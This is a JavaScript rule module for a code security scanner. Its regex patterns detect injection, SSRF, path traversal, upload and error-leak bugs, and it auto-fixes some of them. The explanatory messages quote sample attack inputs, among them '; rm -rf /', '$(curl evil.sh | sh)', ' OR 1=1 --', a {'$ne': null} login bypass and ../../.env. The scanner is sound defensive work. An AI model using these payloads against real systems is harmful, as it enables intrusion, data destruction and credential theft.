'use strict';
/** Injection, SSRF / redirects / path traversal, uploads, error & logging leaks. */

const USER = String.raw`(?:req|request)\.(?:body|query|params|headers|cookies)|req\.param\(|request\.(?:args|form|json|values|data|GET|POST)|ctx\.(?:request|query|params)|searchParams\.get\(|formData\.get\(|event\.body|params\.\w+|\bquery\.\w+`;
const USER_RE = new RegExp(USER);
const SQL_KW = /\b(SELECT\s[\s\S]{1,200}?\sFROM\s|INSERT\s+INTO\s|UPDATE\s+[\w"`.]+\s+SET\s|DELETE\s+FROM\s|WHERE\s+[\w"`.]+\s*(=|LIKE|IN\b|<|>)|DROP\s+TABLE)/i;

module.exports = {
  id: 'injection',
  title: 'Hunting injection, SSRF, upload and error-leak bugs',
  async run(ctx) {
    const { p, det } = ctx;
    let serverCode = false, uploadSeen = false, errorsSeen = false;
    const files = p.codeFiles((x) => /\.(m|c)?(js|ts)x?$|\.(py|php|rb)$/.test(x) && !/vibeguard-security/.test(x)).map((x) => x.path);
    for (const f of files) {
      const c = p.read(f) || '';
      const client = ctx.isClient(f);
      if (!client) serverCode = true;
      const py = /\.py$/.test(f);
      const edits = [];
      let m;

      if (!client) {
        // ---------- SQL injection ----------
        const sqlJs = /\.(query|execute|raw|exec|run|all|get|prepare|\$queryRawUnsafe|\$executeRawUnsafe|unsafe)\s*\(\s*(`[^`]*\$\{[^`]*`|(['"])[^'"\n]*\3\s*\+\s*[\w.[\]()]+)/g;
        while ((m = sqlJs.exec(c))) {
          if (!SQL_KW.test(m[2])) continue;
          ctx.at(f, m.index, { category: 'injection', severity: 'critical', title: 'SQL query built with string concatenation/template', why: "Values pasted into SQL let attackers rewrite the query: ' OR 1=1 -- logs in as anyone, and UNION/DROP can dump or delete your database.", fix: "Use parameters: `db.query('SELECT * FROM users WHERE email = $1', [email])` (pg) / `?` placeholders (mysql/sqlite) / Prisma `$queryRaw` tagged template (not Unsafe)." });
        }
        if (py) {
          const sqlPy = /\.(execute|executemany|raw|text)\s*\(\s*(f["'][^"'\n]*\{|["'][^"'\n]*["']\s*(%|\.format\(|\+))/g;
          while ((m = sqlPy.exec(c))) {
            if (!SQL_KW.test(c.slice(m.index, m.index + 200))) continue;
            ctx.at(f, m.index, { category: 'injection', severity: 'critical', title: 'SQL query built with f-string / % / .format()', why: 'User input becomes part of the SQL command — classic SQL injection.', fix: 'Pass parameters separately: `cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))`.' });
          }
        }
        // ---------- NoSQL injection ----------
        const noSql = /\.(find|findOne|findOneAndUpdate|findOneAndDelete|updateOne|updateMany|deleteOne|deleteMany|countDocuments|exists)\s*\(\s*(req\.(body|query)\s*[,)])/g;
        while ((m = noSql.exec(c))) {
          ctx.at(f, m.index, { category: 'injection', severity: 'high', title: 'Request object passed straight into a MongoDB query', why: 'An attacker can send operators like {"password": {"$ne": null}} to match any user or dump collections.', fix: 'Build the filter from validated fields only, e.g. `{ email: String(req.body.email) }`, and add express-mongo-sanitize.' });
        }
        const noSqlField = /\.(find|findOne|findOneAndUpdate|findOneAndDelete|updateOne|deleteOne|countDocuments)\s*\(\s*\{([^{}]*)\}/g;
        while ((m = noSqlField.exec(c))) {
          const inner = m[2];
          const fieldRe = /(\w+)\s*:\s*(req\.(?:body|query)\.\w+)(?=\s*[,}]|\s*$)/g;
          let fm, found = false;
          let newInner = inner;
          while ((fm = fieldRe.exec(inner))) { found = true; newInner = newInner.replace(fm[0], `${fm[1]}: String(${fm[2]})`); }
          if (!found || !/mongoose|mongodb|\.collection\(|Schema/.test(c)) continue;
          const fd = ctx.at(f, m.index, { category: 'injection', severity: 'high', title: 'MongoDB filter uses raw request values', why: 'If the value is an object like {"$ne": null} instead of a string, the query matches everything — e.g. login without a password.', fix: 'Force values to strings (or validate types) before querying.' });
          edits.push({ index: m.index, old: m[0], new: m[0].replace(inner, newInner), finding: fd, summary: 'Request values are now cast to String() so MongoDB operators can\'t be injected.' });
        }
        const where = /\$where\s*:/.exec(c);
        if (where) ctx.at(f, where.index, { category: 'injection', severity: 'high', title: 'MongoDB $where runs JavaScript', why: '$where executes code on the database server; with user input this is code injection.', fix: 'Replace $where with normal query operators.' });

        // ---------- Command / code injection ----------
        const cmd = /\b(exec|execSync|spawn|spawnSync|execFile)\s*\(\s*(`[^`]*\$\{|['"][^'"]*['"]\s*\+|[^,)]*(?:req\.|request\.|params|query|body))/g;
        while ((m = cmd.exec(c))) {
          if (!/child_process|shelljs|execa/.test(c)) break;
          ctx.at(f, m.index, { category: 'injection', severity: 'critical', title: `${m[1]}() with dynamic input`, why: 'A value like `; rm -rf /` or `$(curl evil.sh | sh)` runs arbitrary commands on your server.', fix: 'Avoid the shell: use execFile/spawn with an argument array and validate inputs against an allow-list.' });
        }
        if (py) {
          const pc = /(os\.system|os\.popen|subprocess\.(?:run|call|Popen|check_output|check_call)\([^)]*shell\s*=\s*True)/g;
          while ((m = pc.exec(c))) {
            ctx.at(f, m.index, { category: 'injection', severity: 'high', title: `${m[1].split('(')[0]} runs a shell command`, why: 'If any part comes from users, it is command injection.', fix: 'Use subprocess.run([...args], shell=False) with validated arguments.' });
          }
          const yl = /\byaml\.load\(\s*([^,)]+)\s*\)/g;
          while ((m = yl.exec(c))) {
            const fd = ctx.at(f, m.index, { category: 'injection', severity: 'high', title: 'yaml.load() can execute code', why: 'yaml.load with the default loader can construct arbitrary Python objects from untrusted YAML.', fix: 'Use yaml.safe_load().' });
            edits.push({ index: m.index, old: m[0], new: `yaml.safe_load(${m[1]})`, finding: fd, summary: 'Switched to yaml.safe_load().' });
          }
          const pk = /\bpickle\.loads?\(|\bmarshal\.loads?\(/g;
          while ((m = pk.exec(c))) ctx.at(f, m.index, { category: 'injection', severity: 'high', title: 'pickle/marshal deserialization', why: 'Loading pickle data from users runs arbitrary code.', fix: 'Use JSON for anything that can come from outside.' });
        }
        const ev = py ? /\b(eval|exec)\s*\(\s*([^)]*)\)/g : /\b(eval|new\s+Function|setTimeout|setInterval|vm\.runIn\w+Context)\s*\(\s*([^)]*)\)/g;
        while ((m = ev.exec(c))) {
          const arg = m[2] || '';
          if (/^(setTimeout|setInterval)$/.test(m[1]) && !/^['"`]/.test(arg.trim())) continue;
          if (!USER_RE.test(arg) && !/input|data|payload|code|expr|user|body/i.test(arg)) continue;
          ctx.at(f, m.index, { category: 'injection', severity: 'critical', title: `${m[1].replace(/\s+/g, ' ')}() on dynamic data`, why: 'Evaluating strings as code lets an attacker run anything on your server.', fix: 'Remove eval; parse data with JSON.parse or a safe expression library.' });
        }

        // ---------- Path traversal ----------
        const pt = new RegExp(String.raw`\b(sendFile|download|readFile|readFileSync|createReadStream|unlink|unlinkSync|writeFile|writeFileSync|open|send_file|send_from_directory)\s*\(([^)]*(?:${USER}|originalname|\.filename)[^)]*)\)`, 'g');
        while ((m = pt.exec(c))) {
          if (/secure_filename|path\.basename|basename\(|normalize.*startsWith/.test(m[2])) continue;
          const cat = /originalname|\.filename/.test(m[2]) ? 'uploads' : 'ssrf';
          ctx.at(f, m.index, { category: cat, severity: 'high', title: `${m[1]}() uses a user-controlled path`, why: 'Inputs like ../../.env let attackers read or overwrite any file on the server.', fix: 'Use path.basename() on the input, join with a fixed folder and verify the resolved path starts with that folder.' });
        }
        // ---------- SSRF ----------
        const ssrf = new RegExp(String.raw`\b(fetch|axios(?:\.(?:get|post|request))?|got|request|http\.get|https\.get|requests\.(?:get|post)|urllib\.request\.urlopen|httpx\.(?:get|post))\s*\(\s*(?:${USER})`, 'g');
        while ((m = ssrf.exec(c))) {
          ctx.at(f, m.index, { category: 'ssrf', severity: 'high', title: 'Server fetches a URL supplied by the user (SSRF)', why: 'Attackers can make your server call internal services or cloud metadata (169.254.169.254) and steal credentials.', fix: 'Only allow https URLs on an explicit host allow-list; block private/link-local IPs.' });
        }
        // ---------- Open redirect ----------
        const red = new RegExp(String.raw`\b(res\.redirect|redirect|NextResponse\.redirect|window\.location(?:\.href)?\s*=)\s*\(?\s*(?:${USER})`, 'g');
        while ((m = red.exec(c))) {
          ctx.at(f, m.index, { category: 'ssrf', severity: 'medium', title: 'Redirect target comes from the request (open redirect)', why: 'Phishers use links like yoursite.com/login?next=https://evil.com to borrow your domain\'s trust.', fix: 'Only redirect to relative paths starting with "/" (and not "//"), or to an allow-list.' });
        }

        // ---------- Uploads ----------
        const mu = /\bmulter\s*\(\s*(\{[\s\S]*?\})?\s*\)/g;
        while ((m = mu.exec(c))) {
          uploadSeen = true;
          const opts = m[1] || '';
          if (!/limits\s*:/.test(opts)) {
            const fd = ctx.at(f, m.index, { category: 'uploads', severity: 'medium', title: 'File uploads have no size limit', why: 'Attackers can fill your disk/memory with huge uploads.', fix: 'Set limits: { fileSize: 5 * 1024 * 1024 } (adjust to your needs).' });
            const newOpts = opts ? opts.replace(/^\{\s*/, '{ limits: { fileSize: 5 * 1024 * 1024 }, ') : '{ limits: { fileSize: 5 * 1024 * 1024 } }';
            edits.push({ index: m.index, old: m[0], new: `multer(${newOpts})`, finding: fd, summary: 'Uploads capped at 5 MB.' });
          }
          if (!/fileFilter/.test(opts) && !/fileFilter/.test(c)) {
            ctx.at(f, m.index, { category: 'uploads', severity: 'low', title: 'File uploads accept any file type', why: 'HTML/SVG/JS uploads served from your domain become stored XSS; executables can be distributed from your site.', fix: 'Add a fileFilter that allows only the MIME types/extensions you need (e.g. image/png, image/jpeg).' });
          }
        }
        const st = /express\.static\(\s*['"`]?[^)]*uploads?/g;
        if ((m = st.exec(c))) {
          uploadSeen = true;
          ctx.at(f, m.index, { category: 'uploads', severity: 'medium', title: 'Uploaded files are served from your own domain', why: 'An uploaded .html or .svg runs scripts as your site (stored XSS).', fix: 'Serve uploads from separate storage (S3/R2/Supabase Storage) or force `Content-Disposition: attachment` and `X-Content-Type-Options: nosniff`.' });
        }
        if (py) {
          const sv = /\.save\(\s*os\.path\.join\(([^)]*?)(\w+)\.filename\s*\)\s*\)/g;
          while ((m = sv.exec(c))) {
            uploadSeen = true;
            const fd = ctx.at(f, m.index, { category: 'uploads', severity: 'high', title: 'Uploaded file saved with its original name', why: 'A filename like ../../app.py overwrites your code (path traversal).', fix: 'Wrap the name with secure_filename().' });
            edits.push({ index: m.index, old: m[0], new: m[0].replace(`${m[2]}.filename`, `secure_filename(${m[2]}.filename)`), finding: fd, summary: 'Filename passed through secure_filename().' });
            ctx._needsSecureFilename = ctx._needsSecureFilename || new Set();
            ctx._needsSecureFilename.add(f);
          }
          if (/request\.files/.test(c)) uploadSeen = true;
        }

        // ---------- Error leaks ----------
        const el = /res\.(?:status\(\s*\d+\s*\)\s*\.)?(?:send|json)\(\s*(?:\{\s*(?:error|err|message)\s*:\s*)?(err|error|e|ex)(\.stack)?\s*\}?\s*\)/g;
        while ((m = el.exec(c))) {
          errorsSeen = true;
          ctx.at(f, m.index, { category: 'errors', severity: m[2] ? 'medium' : 'low', title: m[2] ? 'Stack trace sent to the client' : 'Raw error object sent to the client', why: 'Error details reveal file paths, SQL queries, library versions and sometimes secrets — a map for attackers.', fix: "Log the error on the server (console.error(err)) and send a generic message: res.status(500).json({ error: 'Something went wrong' })." });
        }
        const stackJson = /stack\s*:\s*(err|error|e)\.stack/g;
        while ((m = stackJson.exec(c))) {
          errorsSeen = true;
          if (/NODE_ENV\s*===?\s*['"]production/.test(c.slice(Math.max(0, m.index - 300), m.index))) continue;
          ctx.at(f, m.index, { category: 'errors', severity: 'medium', title: 'Stack trace included in API response', why: 'Exposes internals in production.', fix: "Only include it when process.env.NODE_ENV !== 'production'." });
        }
        if (py) {
          const tb = /traceback\.format_exc\(\)/g;
          while ((m = tb.exec(c))) {
            if (/return|jsonify|Response|HTTPException/.test(c.slice(m.index - 120, m.index + 40))) ctx.at(f, m.index, { category: 'errors', severity: 'medium', title: 'Traceback returned to the user', why: 'Exposes code paths and internals.', fix: 'Log the traceback; return a generic error message.' });
          }
        }
        // logging secrets
        const lg = /(console\.(?:log|info|debug)|print|logger\.(?:info|debug))\s*\(([^)\n]*\b(password|passwd|secret|token|apiKey|api_key|authorization|creditCard|card_number|cvv|req\.headers|req\.body)\b[^)\n]*)\)/gi;
        while ((m = lg.exec(c))) {
          errorsSeen = true;
          ctx.at(f, m.index, { category: 'errors', severity: 'low', title: 'Sensitive data written to logs', why: 'Logs are copied to hosting dashboards, log services and screenshots. Passwords/tokens in logs are leaked secrets.', fix: 'Remove the log or redact sensitive fields.' });
        }
        // GraphQL introspection / playground
        const gq = /(introspection|playground|graphiql)\s*:\s*true/g;
        while ((m = gq.exec(c))) {
          ctx.at(f, m.index, { category: 'api', severity: 'low', title: `GraphQL ${m[1]} enabled`, why: 'In production this hands attackers a full map of your API.', fix: `Use \`${m[1]}: process.env.NODE_ENV !== 'production'\`.` });
          edits.push({ index: m.index, old: m[0], new: `${m[1]}: process.env.NODE_ENV !== 'production'`, finding: ctx.findings[ctx.findings.length - 1], summary: 'Enabled only outside production.' });
        }
      }
      ctx.applyEdits(f, edits);
    }
    for (const f of ctx._needsSecureFilename || []) ctx.ensurePythonImport(f, 'from werkzeug.utils import secure_filename');
    if (serverCode) { ctx.checked('injection'); ctx.checked('ssrf'); ctx.checked('errors'); }
    else {
      ctx.na('injection', 'No server-side code found.');
      ctx.na('ssrf', 'No server-side code found.');
      if (!errorsSeen) ctx.na('errors', 'No server-side code found.');
    }
    if (!uploadSeen) ctx.na('uploads', 'No file upload handling found.');
    else ctx.checked('uploads');
    void det;
  },
};
